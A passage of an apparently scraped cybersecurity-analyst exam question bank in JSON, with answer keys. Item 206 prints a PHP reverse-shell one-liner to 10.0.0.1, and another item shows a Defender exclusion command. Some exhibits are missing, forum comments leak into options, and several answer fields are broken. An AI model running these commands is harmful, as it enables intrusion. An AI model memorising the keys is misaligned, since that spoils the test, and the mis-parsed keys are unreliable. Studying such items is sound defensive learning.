{"letter": "D", "text": "Threshold value"}], "answer": "D"}, {"id": 206, "question": "While reviewing web server logs, a security analyst discovers the following suspicious line:\nphp -r ’$socket=fsockopen(\"10.0.0.1\", 1234); passthru (\"/bin/sh -i <&3 >&3 2>&3\");’\nWhich of the following is being attempted?", "options": [{"letter": "A", "text": "Remote file inclusion"}, {"letter": "B", "text": "Command injection"}, {"letter": "C", "text": "Server-side request forgery"}, {"letter": "D", "text": "Reverse shell"}], "answer": "D"}, {"id": 207, "question": "Which of the following should be updated after a lessons-learned review?", "options": [{"letter": "A", "text": "Disaster recovery plan"}, {"letter": "B", "text": "Business continuity plan"}, {"letter": "C", "text": "Tabletop exercise"}, {"letter": "D", "text": "Incident response plan"}], "answer": "D"}, {"id": 208, "question": "A software developer has been deploying web applications with common security risks to include insufficient logging capabilities. Which of the\nfollowing actions would be most effective to reduce risks associated with the application development?", "options": [{"letter": "A", "text": "Perform static analyses using an integrated development environment"}, {"letter": "B", "text": "Deploy compensating controls into the environment"}, {"letter": "C", "text": "Implement server-side logging and automatic updates"}, {"letter": "D", "text": "Conduct regular code reviews using OWASP best practices"}], "answer": "D"}, {"id": 209, "question": "An analyst suspects cleartext passwords are being sent over the network. Which of the following tools would best support the analyst's\ninvestigation?", "options": [{"letter": "A", "text": "OpenVAS"}, {"letter": "B", "text": "Angry IP Scanner"}, {"letter": "C", "text": "Wireshark"}, {"letter": "D", "text": "Maltego"}], "answer": "C"}, {"id": 210, "question": "Using open-source intelligence gathered from technical forums, a threat actor compiles and tests a malicious downloader to ensure it will not be\ndetected by the victim organization's endpoint security protections. Which of the following stages of the Cyber Kill Chain best aligns with the\nthreat actor's actions?", "options": [{"letter": "A", "text": "Delivery"}, {"letter": "B", "text": "Reconnaissance"}, {"letter": "C", "text": "Exploitation"}, {"letter": "D", "text": "Weaponization"}], "answer": "D"}, {"id": 211, "question": "An organization would like to ensure its cloud infrastructure has a hardened configuration. A requirement is to create a server image that can be\ndeployed with a secure template. Which of the following is the best resource to ensure secure configuration?", "options": [{"letter": "A", "text": "CIS Benchmarks"}, {"letter": "B", "text": "PCI DSS"}, {"letter": "C", "text": "OWASP Top Ten"}, {"letter": "D", "text": "ISO 27001"}], "answer": "A"}, {"id": 212, "question": "A security analyst reviews the following Arachni scan results for a web application that stores PII data:\nWhich of the following should be remediated first?", "options": [{"letter": "A", "text": "SQL injection"}, {"letter": "B", "text": "RFI"}, {"letter": "C", "text": "XSS"}, {"letter": "D", "text": "Code injection"}], "answer": "A"}, {"id": 213, "question": "Which of the following stakeholders are most likely to receive a vulnerability scan report? (Choose two.)", "options": [{"letter": "A", "text": "Executive management"}, {"letter": "B", "text": "Law enforcement"}, {"letter": "C", "text": "Marketing"}, {"letter": "D", "text": "Legal"}, {"letter": "E", "text": "Product owner"}, {"letter": "F", "text": "Systems administration"}], "answer": "EF"}, {"id": 214, "question": "Which of the following techniques can help a SOC team to reduce the number of alerts related to the internal security activities that the analysts\nhave to triage?", "options": [{"letter": "A", "text": "Enrich the SIEM-ingested data to include all data required for triage"}, {"letter": "B", "text": "Schedule a task to disable alerting when vulnerability scans are executing"}, {"letter": "C", "text": "Filter all alarms in the SIEM with low seventy"}, {"letter": "D", "text": "Add a SOAR rule to drop irrelevant and duplicated notifications"}], "answer": "D"}, {"id": 215, "question": "An analyst is evaluating a vulnerability management dashboard. The analyst sees that a previously remediated vulnerability has reappeared on a\ndatabase server. Which of the following is the most likely cause?", "options": [{"letter": "A", "text": "The finding is a false positive and should be ignored."}, {"letter": "B", "text": "A rollback had been executed on the instance."}, {"letter": "C", "text": "The vulnerability scanner was configured without credentials."}, {"letter": "D", "text": "The vulnerability management software needs to be updated."}], "answer": "B"}, {"id": 216, "question": "A company has decided to expose several systems to the internet. The systems are currently available internally only. A security analyst is using a\nsubset of CVSS3.1 exploitability metrics to prioritize the vulnerabilities that would be the most exploitable when the systems are exposed to the\ninternet. The systems and the vulnerabilities are shown below:\nWhich of the following systems should be prioritized for patching?", "options": [{"letter": "A", "text": "brown"}, {"letter": "B", "text": "grey"}, {"letter": "C", "text": "blane"}, {"letter": "D", "text": "sullivan"}], "answer": "C"}, {"id": 217, "question": "During an incident in which a user machine was compromised, an analyst recovered a binary file that potentially caused the exploitation. Which of\nthe following techniques could be used for further analysis?", "options": [{"letter": "A", "text": "Fuzzing"}, {"letter": "B", "text": "Static analysis"}, {"letter": "C", "text": "Sandboxing"}, {"letter": "D", "text": "Packet capture"}], "answer": "B"}, {"id": 218, "question": "A leader on the vulnerability management team is trying to reduce the team's workload by automating some simple but time-consuming tasks.\nWhich of the following activities should the team leader consider first?", "options": [{"letter": "A", "text": "Assigning a custom recommendation for each finding"}, {"letter": "B", "text": "Analyzing false positives"}, {"letter": "C", "text": "Rendering an additional executive report"}, {"letter": "D", "text": "Regularly checking agent communication with the central console"}], "answer": "D"}, {"id": 219, "question": "The Chief Information Security Officer (CISO) of a large management firm has selected a cybersecurity framework that will help the organization\ndemonstrate its investment in tools and systems to protect its data. Which of the following did the CISO most likely select?", "options": [{"letter": "A", "text": "PCI DSS"}, {"letter": "B", "text": "COBIT"}, {"letter": "C", "text": "ISO 27001"}, {"letter": "D", "text": "ITIL"}], "answer": "C"}, {"id": 220, "question": "A high volume of failed RDP authentication attempts was logged on a critical server within a one-hour period. All of the attempts originated from\nthe same remote IP address and made use of a single valid domain user account. Which of the following would be the most effective mitigating\ncontrol to reduce the rate of success of this brute-force attack?", "options": [{"letter": "A", "text": "Enabling a user account lockout after a limited number of failed attempts"}, {"letter": "B", "text": "Installing a third-party remote access tool and disabling RDP on all devices"}, {"letter": "C", "text": "Implementing a firewall block for the remote system's IP address"}, {"letter": "D", "text": "Increasing the verbosity of log-on event auditing on all devices"}], "answer": "A"}, {"id": 221, "question": "An incident response analyst is investigating the root cause of a recent malware outbreak. Initial binary analysis indicates that this malware\ndisables host security services and performs cleanup routines on its infected hosts, including deletion of initial dropper and removal of event log\nentries and prefetch files from the host. Which of the following data sources would most likely reveal evidence of the root cause? (Choose two.)", "options": [{"letter": "A", "text": "Creation time of dropper"}, {"letter": "B", "text": "Registry artifacts"}, {"letter": "C", "text": "EDR data"}, {"letter": "D", "text": "Prefetch files"}, {"letter": "E", "text": "File system metadata"}, {"letter": "F", "text": "Sysmon event log"}], "answer": "BC"}, {"id": 222, "question": "When undertaking a cloud migration of multiple SaaS applications, an organization's systems administrators struggled with the complexity of\nextending identity and access management to cloud-based assets. Which of the following service models would have reduced the complexity of\nthis project?", "options": [{"letter": "A", "text": "CASB"}, {"letter": "B", "text": "SASE"}, {"letter": "C", "text": "ZTNA"}, {"letter": "D", "text": "SWG"}], "answer": "A"}, {"id": 223, "question": "A security analyst reviews the following extract of a vulnerability scan that was performed against the web server:\nWhich of the following recommendations should the security analyst provide to harden the web server?", "options": [{"letter": "A", "text": "Remove the version information on http-server-header."}, {"letter": "B", "text": "Disable tcp_wrappers."}, {"letter": "C", "text": "Delete the /wp-login.php folder."}, {"letter": "D", "text": "Close port 22."}], "answer": "A"}, {"id": 224, "question": "A security analyst is responding to an incident that involves a malicious attack on a network data closet. Which of the following best explains how\nthe analyst should properly document the incident?", "options": [{"letter": "A", "text": "Back up the configuration file for all network devices."}, {"letter": "B", "text": "Record and validate each connection."}, {"letter": "C", "text": "Create a full diagram of the network infrastructure."}, {"letter": "D", "text": "Take photos of the impacted items."}], "answer": "D"}, {"id": 225, "question": "A cybersecurity analyst is participating with the DLP project team to classify the organization's data. Which of the following is the primary purpose\nfor classifying data?", "options": [{"letter": "A", "text": "To identify regulatory compliance requirements"}, {"letter": "B", "text": "To facilitate the creation of DLP rules"}, {"letter": "C", "text": "To prioritize IT expenses"}, {"letter": "D", "text": "To establish the value of data to the organization"}], "answer": "D"}, {"id": 226, "question": "A security analyst observed the following activity from a privileged account:\n• Accessing emails and sensitive information\n• Audit logs being modified\n• Abnormal log-in times\nWhich of the following best describes the observed activity?", "options": [{"letter": "A", "text": "Irregular peer-to-peer communication"}, {"letter": "B", "text": "Unauthorized privileges"}, {"letter": "C", "text": "Rogue devices on the network"}, {"letter": "D", "text": "Insider attack"}], "answer": "D"}, {"id": 227, "question": "A vulnerability management team found four major vulnerabilities during an assessment and needs to provide a report for the proper prioritization\nfor further mitigation. Which of the following vulnerabilities should have the highest priority for the mitigation process?", "options": [{"letter": "A", "text": "A vulnerability that has related threats and IoCs, targeting a different industry"}, {"letter": "B", "text": "A vulnerability that is related to a specific adversary campaign, with IoCs found in the SIEM"}, {"letter": "C", "text": "A vulnerability that has no adversaries using it or associated IoCs"}, {"letter": "D", "text": "A vulnerability that is related to an isolated system, with no IoCs"}], "answer": "B"}, {"id": 228, "question": "A security analyst received an alert regarding multiple successful MFA log-ins for a particular user. When reviewing the authentication logs, the\nanalyst sees the following:\nWhich of the following are most likely occurring, base on the MFA logs? (Choose two.)", "options": [{"letter": "A", "text": "Dictionary attack"}, {"letter": "B", "text": "Push phishing"}, {"letter": "C", "text": "Impossible geo-velocity"}, {"letter": "D", "text": "Subscriber identity module swapping"}, {"letter": "E", "text": "Rogue access point"}, {"letter": "F", "text": "Password spray"}], "answer": "CD"}, {"id": 229, "question": "A security analyst has identified a new malware file that has impacted the organization. The malware is polymorphic and has built-in conditional\ntriggers that require a connection to the internet. The CPU has an idle process of at least 70%. Which of the following best describes how the\nsecurity analyst can effectively review the malware without compromising the organization’s network?", "options": [{"letter": "A", "text": "Utilize an RDP session on an unused workstation to evaluate the malware."}, {"letter": "B", "text": "Disconnect and utilize an existing infected asset off the network."}, {"letter": "C", "text": "Create a virtual host for testing on the security analyst workstation."}, {"letter": "D", "text": "Subscribe to an online service to create a sandbox environment."}], "answer": "D"}, {"id": 230, "question": "Which of the following threat-modeling procedures is in the OWASP Web Security Testing Guide?", "options": [{"letter": "A", "text": "Review of security requirements"}, {"letter": "B", "text": "Compliance checks"}, {"letter": "C", "text": "Decomposing the application"}, {"letter": "D", "text": "Security by design"}], "answer": "C"}, {"id": 231, "question": "Which of the following would an organization use to develop a business continuity plan?", "options": [{"letter": "A", "text": "A diagram of all systems and interdependent applications"}, {"letter": "B", "text": "A repository for all the software used by the organization"}, {"letter": "C", "text": "A prioritized list of critical systems defined by executive leadership"}, {"letter": "D", "text": "A configuration management database in print at an off-site location"}], "answer": "C"}, {"id": 232, "question": "The management team requests monthly KPI reports on the company’s cybersecurity program. Which of the following KPIs would identify how\nlong a security threat goes unnoticed in the environment?", "options": [{"letter": "A", "text": "Employee turnover"}, {"letter": "B", "text": "Intrusion attempts"}, {"letter": "C", "text": "Mean time to detect"}, {"letter": "D", "text": "Level of preparedness"}], "answer": "C"}, {"id": 233, "question": "Which of the following best describes the key elements of a successful information security program?", "options": [{"letter": "A", "text": "Business impact analysis, asset and change management, and security communication plan"}, {"letter": "B", "text": "Security policy implementation, assignment of roles and responsibilities, and information asset classification"}, {"letter": "C", "text": "Disaster recovery and business continuity planning, and the definition of access control requirements and human resource policies"}, {"letter": "D", "text": "Senior management organizational structure, message distribution standards, and procedures for the operation of security management\nsystems"}], "answer": "B"}, {"id": 234, "question": "A systems administrator notices unfamiliar directory names on a production server. The administrator reviews the directory listings and files, and\nthen concludes the server has been compromised. Which of the following steps should the administrator take next?", "options": [{"letter": "A", "text": "Inform the internal incident response team."}, {"letter": "B", "text": "Follow the company's incident response plan."}, {"letter": "C", "text": "Review the lessons learned for the best approach."}, {"letter": "D", "text": "Determine when the access started."}], "answer": "B"}, {"id": 235, "question": "Which of the following is a nation-state actor least likely to be concerned with?", "options": [{"letter": "A", "text": "Detection by MITRE ATT&CK framework."}, {"letter": "B", "text": "Detection or prevention of reconnaissance activities."}, {"letter": "C", "text": "Examination of its actions and objectives."}, {"letter": "D", "text": "Forensic analysis for legal action of the actions taken."}], "answer": "D"}, {"id": 236, "question": "Which of the following is a commonly used four-component framework to communicate threat actor behavior?", "options": [{"letter": "A", "text": "STRIDE"}, {"letter": "B", "text": "Diamond Model of Intrusion Analysis"}, {"letter": "C", "text": "Cyber Kill Chain"}, {"letter": "D", "text": "MITRE ATT&CK"}], "answer": "B"}, {"id": 237, "question": "An employee downloads a freeware program to change the desktop to the classic look of legacy Windows. Shortly after the employee installs the\nprogram, a high volume of random DNS queries begin to originate from the system. An investigation on the system reveals the following:\nAdd-MpPreference –ExclusionPath ‘%Program Files%\\ksyconfig’\nWhich of the following is possibly occurring?", "options": [{"letter": "A", "text": "Persistence"}, {"letter": "B", "text": "Privilege escalation"}, {"letter": "C", "text": "Credential harvesting"}, {"letter": "D", "text": "Defense evasion"}], "answer": "D"}, {"id": 238, "question": "An organization discovered a data breach that resulted in PII being released to the public. During the lessons learned review, the panel identified\ndiscrepancies regarding who was responsible for external reporting, as well as the timing requirements. Which of the following actions would best\naddress the reporting issue?", "options": [{"letter": "A", "text": "Creating a playbook denoting specific SLAs and containment actions per incident type"}, {"letter": "B", "text": "Researching federal laws, regulatory compliance requirements, and organizational policies to document specific reporting SLAs"}, {"letter": "C", "text": "Defining which security incidents require external notifications and incident reporting in addition to internal stakeholders"}, {"letter": "D", "text": "Designating specific roles and responsibilities within the security team and stakeholders to streamline tasks"}], "answer": "B"}, {"id": 239, "question": "During an incident, a security analyst discovers a large amount of PII has been emailed externally from an employee to a public email address. The\nanalyst finds that the external email is the employee’s personal email. Which of the following should the analyst recommend be done first?", "options": [{"letter": "A", "text": "Place a legal hold on the employee’s mailbox."}, {"letter": "B", "text": "Enable filtering on the web proxy."}, {"letter": "C", "text": "Disable the public email access with CASB."}, {"letter": "D", "text": "Configure a deny rule on the firewall."}], "answer": "A"}, {"id": 240, "question": "Which of the following can be used to learn more about TTPs used by cybercriminals?", "options": [{"letter": "A", "text": "ZenMAP"}, {"letter": "B", "text": "MITRE ATT&CK"}, {"letter": "C", "text": "National Institute of Standards and Technology"}, {"letter": "D", "text": "theHarvester"}], "answer": "B"}, {"id": 241, "question": "Which of the following statements best describes the MITRE ATT&CK framework?", "options": [{"letter": "A", "text": "It provides a comprehensive method to test the security of applications."}, {"letter": "B", "text": "It provides threat intelligence sharing and development of action and mitigation strategies."}, {"letter": "C", "text": "It helps identify and stop enemy activity by highlighting the areas where an attacker functions."}, {"letter": "D", "text": "It tracks and understands threats and is an open-source project that evolves."}, {"letter": "E", "text": "It breaks down intrusions into a clearly defined sequence of phases."}], "answer": "C"}, {"id": 242, "question": "A Chief Information Security Officer (CISO) is concerned that a specific threat actor who is known to target the company’s business type may be\nable to breach the network and remain inside of it for an extended period of time. Which of the following techniques should be performed to meet\nthe CISO’s goals?", "options": [{"letter": "A", "text": "Vulnerability scanning"}, {"letter": "B", "text": "Adversary emulation"}, {"letter": "C", "text": "Passive discovery"}, {"letter": "D", "text": "Bug bounty"}], "answer": "B"}, {"id": 243, "question": "A security analyst receives an alert for suspicious activity on a company laptop. An excerpt of the log is shown below:\nWhich of the following has most likely occurred?", "options": [{"letter": "A", "text": "An Office document with a malicious macro was opened."}, {"letter": "B", "text": "A credential-stealing website was visited."}, {"letter": "C", "text": "A phishing link in an email was clicked."}, {"letter": "D", "text": "A web browser vulnerability was exploited."}], "answer": "A"}, {"id": 244, "question": "During an incident, some IoCs of possible ransomware contamination were found in a group of servers in a segment of the network. Which of the\nfollowing steps should be taken next?", "options": [{"letter": "A", "text": "Isolation"}, {"letter": "B", "text": "Remediation"}, {"letter": "C", "text": "Reimaging"}, {"letter": "D", "text": "Preservation"}], "answer": "A"}, {"id": 245, "question": "An MSSP received several alerts from customer 1, which caused a missed incident response deadline for customer 2. Which of the following best\ndescribes the document that was violated?", "options": [{"letter": "A", "text": "KPI"}, {"letter": "B", "text": "SLO"}, {"letter": "C", "text": "SLA"}, {"letter": "D", "text": "MOU"}], "answer": "C"}, {"id": 246, "question": "Which of the following is a reason proper handling and reporting of existing evidence are important for the investigation and reporting phases of\nan incident response?", "options": [{"letter": "A", "text": "To ensure the report is legally acceptable in case it needs to be presented in court"}, {"letter": "B", "text": "To present a lessons-learned analysis for the incident response team"}, {"letter": "C", "text": "To ensure the evidence can be used in a postmortem analysis"}, {"letter": "D", "text": "To prevent the possible loss of a data source for further root cause analysis"}], "answer": "A"}, {"id": 247, "question": "An attacker has just gained access to the syslog server on a LAN. Reviewing the syslog entries has allowed the attacker to prioritize possible next\ntargets. Which of the following is this an example of?", "options": [{"letter": "A", "text": "Passive network footprinting"}, {"letter": "B", "text": "OS fingerprinting"}, {"letter": "C", "text": "Service port identification"}, {"letter": "D", "text": "Application versioning"}], "answer": "A"}, {"id": 248, "question": "A security analyst observed the following activities in chronological order:\n1. Protocol violation alerts on external firewall\n2. Unauthorized internal scanning activity\n3. Changes in outbound network performance\nWhich of the following best describes the goal of the threat actor?", "options": [{"letter": "A", "text": "Data exfiltration"}, {"letter": "B", "text": "Unusual traffic spikes"}, {"letter": "C", "text": "Rogue devices"}, {"letter": "D", "text": "Irregular peer-to-peer communication"}], "answer": "A"}, {"id": 249, "question": "After reviewing the final report for a penetration test, a cybersecurity analyst prioritizes the remediation for input validation vulnerabilities. Which\nof the following attacks is the analyst seeking to prevent?", "options": [{"letter": "A", "text": "DNS poisoning"}, {"letter": "B", "text": "Pharming"}, {"letter": "C", "text": "Phishing"}, {"letter": "D", "text": "Cross-site scripting"}], "answer": "D"}, {"id": 250, "question": "During a security test, a security analyst found a critical application with a buffer overflow vulnerability. Which of the following would be best to\nmitigate the vulnerability at the application level?", "options": [{"letter": "A", "text": "Perform OS hardening."}, {"letter": "B", "text": "Implement input validation."}, {"letter": "C", "text": "Update third-party dependencies."}, {"letter": "D", "text": "Configure address space layout randomization."}], "answer": "B"}, {"id": 251, "question": "The SOC received a threat intelligence notification indicating that an employee’s credentials were found on the dark web. The user’s web and log-in\nactivities were reviewed for malicious or anomalous connections, data uploads/downloads, and exploits. A review of the controls confirmed\nmultifactor authentication was enabled. Which of the following should be done first to mitigate impact to the business networks and assets?", "options": [{"letter": "A", "text": "Perform a forced password reset."}, {"letter": "B", "text": "Communicate the compromised credentials to the user."}, {"letter": "C", "text": "Perform an ad hoc AV scan on the user's laptop."}, {"letter": "D", "text": "Review and ensure privileges assigned to the user’s account reflect least privilege."}, {"letter": "E", "text": "Lower the thresholds for SOC alerting of suspected malicious activity"}], "answer": "A"}, {"id": 252, "question": "A security analyst is working on a server patch management policy that will allow the infrastructure team to be informed more quickly about new\npatches. Which of the following would most likely be required by the infrastructure team so that vulnerabilities can be remediated quickly?\n(Choose two.)", "options": [{"letter": "A", "text": "Hostname"}, {"letter": "B", "text": "Missing KPI"}, {"letter": "C", "text": "CVE details"}, {"letter": "D", "text": "POC availabilty"}, {"letter": "E", "text": "IoCs"}, {"letter": "F", "text": "npm identifier"}], "answer": "CD"}, {"id": 253, "question": "Chief Information Security Officer (CISO) wants to disable a functionality on a business-critical web application that is vulnerable to RCE in order\nto maintain the minimum risk level with minimal increased cost. Which of the following risk treatments best describes what the CISO is looking\nfor?", "options": [{"letter": "A", "text": "Transfer"}, {"letter": "B", "text": "Mitigate"}, {"letter": "C", "text": "Accept"}, {"letter": "D", "text": "Avoid"}], "answer": "B"}, {"id": 254, "question": "A company has a primary control in place to restrict access to a sensitive database. However, the company discovered an authentication\nvulnerability that could bypass this control. Which of the following is the best compensating control?", "options": [{"letter": "A", "text": "Running regular penetration tests to identify and address new vulnerabilities."}, {"letter": "B", "text": "Conducting regular security awareness training of employees to prevent social engineering attacks."}, {"letter": "C", "text": "Deploying an additional layer of access controls to verify authorized individuals."}, {"letter": "D", "text": "Implementing intrusion detection software to alert security teams of unauthorized access attempts"}], "answer": "C"}, {"id": 255, "question": "An analyst discovers unusual outbound connections to an IP that was previously blocked at the web proxy and firewall. Upon further investigation,\nit appears that the proxy and firewall rules that were in place were removed by a service account that is not recognized. Which of the following\nparts of the Cyber Kill Chain does this describe?", "options": [{"letter": "A", "text": "Delivery"}, {"letter": "B", "text": "Command and control"}, {"letter": "C", "text": "Reconnaissance"}, {"letter": "D", "text": "Weaponization"}], "answer": "B"}, {"id": 256, "question": "An organization's email account was compromised by a bad actor. Given the following information:\nWhich of the following is the length of time the team took to detect the threat?", "options": [{"letter": "A", "text": "25 minutes"}, {"letter": "B", "text": "40 minutes"}, {"letter": "C", "text": "45 minutes"}, {"letter": "D", "text": "2 hours"}], "answer": "A"}, {"id": 257, "question": "A threat hunter seeks to identify new persistence mechanisms installed in an organization’s environment. In collecting scheduled tasks from all\nenterprise workstations, the following host details are aggregated:\nWhich of the following actions should the hunter perform first based on the details above?", "options": [{"letter": "A", "text": "Acquire a copy of taskhw.exe from the impacted host."}, {"letter": "B", "text": "Scan the enterprise to identify other systems with taskhdw.exe present."}, {"letter": "C", "text": "Perform a public search for malware reports on the taskhw.exe."}, {"letter": "D", "text": "Change the account that runs the taskhw.exe scheduled task."}], "answer": "A"}, {"id": 258, "question": "A SOC analyst is analyzing traffic on a network and notices an unauthorized scan. Which of the following types of activities is being observed?", "options": [{"letter": "A", "text": "Potential precursor to an attack"}, {"letter": "B", "text": "Unauthorized peer-to-peer communication"}, {"letter": "C", "text": "Rogue device on the network"}, {"letter": "D", "text": "System updates."}], "answer": "A"}, {"id": 259, "question": "HOTSPOT\n-\nWelcome to the Enterprise Help Desk System. Please work the ticket escalated to you in the help desk ticket queue.\nINSTRUCTIONS\n-\nClick on the ticket to see the ticket details. Additional content is available on tabs within the ticket.\nFirst, select the appropriate issue from the drop-down menu. Then, select the MOST likely root cause from second drop-down menu.\nIf at any time you would like to bring back the initial state of the simulation, please click the Reset All button.", "options": [{"letter": "", "text": "No answer choices parsed. Use the PDF for this PBQ/image-based item."}], "answer": ""}, {"id": 260, "question": "SIMULATION\n-\nA company recently experienced a security incident. The security team has determined a user clicked on a link embedded in a phishing email that\nwas sent to the entire company. The link resulted in a malware download, which was subsequently installed and run.\nINSTRUCTIONS\n-\nPart 1\n-\nReview the artifacts associated with the security Incident. Identify the name of the malware, the malicious IP address, and the date and time when\nthe malware executable entered the organization.\nPart 2\n-\nReview the kill chain items and select an appropriate control for each that would improve the security posture of the organization and would have\nhelped to prevent this incident from occurring. Each control may only be used once, and not all controls will be used.\nIf at any time you would like to bring back the initial state of the simulation, please click the Reset All button.", "options": [{"letter": "", "text": "No answer choices parsed. Use the PDF for this PBQ/image-based item."}], "answer": ""}, {"id": 261, "question": "A cybersecurity analyst is recommending a solution to ensure emails that contain links or attachments are tested before they reach a mail server.\nWhich of the following will the analyst most likely recommend?", "options": [{"letter": "A", "text": "Sandboxing"}, {"letter": "B", "text": "MFA"}, {"letter": "C", "text": "DKIM"}, {"letter": "D", "text": "Vulnerability scan\nCorrect Answer: A\nCommunity vote distribution\nA (100%)\n  HeatSquad77 3 months, 2 weeks ago\nSelected Answer: A\nThe correct option is   ✅ A. Sandboxing.\nExplanation\nSandboxing is a security technique that executes suspicious code, links, or attachments in a safe, isolated environment (a \"sandbox\") that mimics an\nend-user operating system. By testing these elements before they reach the mail server or user network, an analyst can observe malicious behavior—\nsuch as malware execution or phishing redirects—without risking the actual production systems.\nupvoted 1 times\n  fafd232_ 1 year, 1 month ago\nSelected Answer: A\nChatGPT:\nThe best option in this scenario is sandboxing (A). Sandboxing allows attachments or links to be \"detonated\" or tested in a secure, isolated\nenvironment before they ever reach the user’s mailbox, helping detect and block potential threats.\nupvoted 2 times"}], "answer": "N"}, {"id": 262, "question": "An analyst reviews a recent government alert on new zero-day threats and finds the following CVE metrics for the most critical of the\nvulnerabilities:\nCVSS:3.1/AV:C:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:U/RL:W/RC:R\nWhich of the following represents the exploit code maturity of this critical vulnerability?", "options": [{"letter": "A", "text": "E:U"}, {"letter": "B", "text": "S:C"}, {"letter": "C", "text": "RC:R"}, {"letter": "D", "text": "AV:N"}, {"letter": "E", "text": "AC:L"}], "answer": "A"}, {"id": 263, "question": "A security analyst detects an email server that had been compromised in the internal network. Users have been reporting strange messages in\ntheir email inboxes and unusual network traffic. Which of the following incident response steps should be performed next?", "options": [{"letter": "A", "text": "Preparation"}, {"letter": "B", "text": "Validation"}, {"letter": "C", "text": "Containment"}, {"letter": "D", "text": "Eradication"}], "answer": "C"}, {"id": 264, "question": "A SIEM alert is triggered based on execution of a suspicious one-liner on two workstations in the organization’s environment. An analyst views the\ndetails of these events below:\nWhich of the following statements best describes the intent of the attacker, based on this one-liner?", "options": [{"letter": "A", "text": "Attacker is escalating privileges via JavaScript."}, {"letter": "B", "text": "Attacker is utilizing custom malware to download an additional script."}, {"letter": "C", "text": "Attacker is executing PowerShell script “AccessToken.ps1”."}, {"letter": "D", "text": "Attacker is attempting to install persistence mechanisms on the target machine."}], "answer": "C"}, {"id": 265, "question": "When investigating a potentially compromised host, an analyst observes that the process BGInfo.exe (PID 1024), a Sysinternals tool used to\ncreate desktop backgrounds containing host details, has been running for over two days. Which of the following activities will provide the best\ninsight into this potentially malicious process, based on the anomalous behavior?", "options": [{"letter": "A", "text": "Changes to system environment variables"}, {"letter": "B", "text": "SMB network traffic related to the system process"}, {"letter": "C", "text": "Recent browser history of the primary user"}, {"letter": "D", "text": "Activities taken by PID 1024\nCorrect Answer: D\nCommunity vote distribution\nD (100%)\n  luiiizsoares Highly Voted  1 year, 5 months ago\nSelected Answer: D\nWhen investigating suspicious processes, analyzing the specific activities of the PID in question provides the most direct insight into whether it is\nbehaving maliciously. This includes actions like file modifications, network connections, memory usage, and system calls made by that process.\nIn this case, the process BGInfo.exe—a legitimate Sysinternals tool—is behaving anomalously (running for an extended period, which is uncommon\nfor such a tool). Observing PID 1024's activities will help determine if the process has been tampered with, replaced, or is being abused by an\nattacker.\nupvoted 6 times"}], "answer": "N"}, {"id": 266, "question": "Which of the following evidence collection methods is most likely to be acceptable in court cases?", "options": [{"letter": "A", "text": "Copying all access files at the time of the incident"}, {"letter": "B", "text": "Creating a file-level archive of all files"}, {"letter": "C", "text": "Providing a full system backup inventory"}, {"letter": "D", "text": "Providing a bit-level image of the hard drive"}], "answer": "D"}, {"id": 267, "question": "A cybersecurity analyst has recovered a recently compromised server to its previous state. Which of the following should the analyst perform\nnext?", "options": [{"letter": "A", "text": "Eradication"}, {"letter": "B", "text": "Isolation"}, {"letter": "C", "text": "Reporting"}, {"letter": "D", "text": "Forensic analysis"}], "answer": "D"}, {"id": 268, "question": "SIMULATION\n-\nYou are a penetration tester who is reviewing the system hardening guidelines for a company's distribution center. The company's hardening\nguidelines indicate the following:\n• There must be one primary server or service per device.\n• Only default ports should be used.\n• Non-secure protocols should be disabled.\n• The corporate Internet presence should be placed in a protected subnet.\nINSTRUCTIONS\n-\nUsing the tools available, discover devices on the corporate network and the services that are running on these devices.\nYou must determine:\n• The IP address of each device.\n• The primary server or service of each device.\n• The protocols that should be disabled based on the hardening guidelines.\nIf at any time you would like to bring back the initial state of the simulation, please click the Reset All button.\nCorrect Answer:\n  ID77 Highly Voted  1 year, 7 months ago\nNote that you have to type the nmap commands yourself nmap and the computer name of each one.\nCandyMan- File Server, 192.168.1.20, FTP21\nFarmerLaura- Mail Server 192.168.1.30, IMAP 143\nSandwichSara- Database, 192.168.1.40, DNS 53\nFarmer Ted- Switch, 192.168.1.10, Telenet 23\nLunch TimeMike- Webserver, 10.10.10.25, HTTP 80\nupvoted 15 times\n  hashed_pony 1 year, 4 months ago\nWhy is DNS 53 the vulnerable one for database? Because of DNS exfiltration?\nupvoted 1 times\n  ID77 1 year, 7 months ago\nnmap<host>\nping<host>\nhelp\nupvoted 6 times\n  lj22HI Highly Voted  1 year, 6 months ago\nThis link may be of use:\nhttps://www.examtopics.com/discussions/comptia/view/83306-exam-cs0-002-topic-1-question-6-discussion/\nupvoted 7 times\n  mambamental24 Most Recent  1 year, 1 month ago\nDoes it give you the nmap command or should we already know it??\nupvoted 1 times\n  maggie22 1 year, 7 months ago\nThe answer is wrong. You can't just put IP adresses without checking each machine's IP address.\nupvoted 1 times\n  pinderanttal 1 year, 7 months ago\nPlease follow the above link. The answer provided is not accurate as per the requirements. Also, this question is an old question, so it is better to\nfollow the above.\nThe reasons why I search. They ask for the primary server and service per system.\nFor the First system, they answered File Server and for the rest of the systems they just suggested Web Server. Why they didn't choose a Mail server,\nDatabase and Switch Server?\nAnd still not sure how to close/disable the non-secure protocols from the console via any other system.\nupvoted 2 times", "options": [{"letter": "", "text": "No answer choices parsed. Use the PDF for this PBQ/image-based item."}], "answer": "N"}, {"id": 269, "question": "A cybersecurity analyst has been assigned to the threat-hunting team to crea
